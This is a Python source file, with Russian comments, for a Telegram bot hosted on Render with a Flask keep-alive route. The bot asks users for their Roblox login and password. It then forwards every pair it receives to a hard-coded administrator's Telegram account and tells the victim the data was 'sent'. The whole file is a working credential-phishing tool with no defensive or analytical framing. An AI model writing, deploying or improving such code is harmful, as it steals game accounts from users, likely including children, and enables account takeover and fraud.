import os
import telebot
from flask import Flask
import threading

TOKEN = os.environ.get("TELEGRAM_TOKEN")  # Токен из Render
ADMIN_ID = 123456789  # ТВОЙ ID В ТЕЛЕГЕ (узнай у @userinfobot)

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "Введи логин и пароль от Roblox через пробел")

@bot.message_handler(func=lambda m: True)
def get_data(message):
    try:
        login, password = message.text.split()
        bot.send_message(ADMIN_ID, f"Логин: {login}\nПароль: {password}")
        bot.send_message(message.chat.id, "✅ Отправлено!")
    except:
        bot.send_message(message.chat.id, "Ошибка, пиши: логин пароль")

# Запускаем бота в фоне
thread = threading.Thread(target=bot.polling, args=({'none_stop': True}))
thread.start()

@app.route('/')
def home():
    return "Bot is running"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
